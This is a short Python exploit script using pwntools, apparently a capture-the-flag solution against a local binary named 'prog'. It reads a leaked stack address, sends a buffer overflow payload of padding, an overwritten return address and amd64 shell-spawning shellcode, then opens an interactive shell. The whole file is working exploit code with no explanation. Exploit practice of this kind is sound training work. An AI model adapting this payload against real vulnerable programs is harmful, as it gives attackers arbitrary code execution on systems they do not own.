from pwn import *

p = process('./prog')

p.readuntil('at')
addr = int(p.readline(), 0)

payload = 'A'*9
payload += p64(addr + 9 + 8)
payload += asm(shellcraft.sh(), arch='amd64')

p.sendline(payload)
p.interactive()
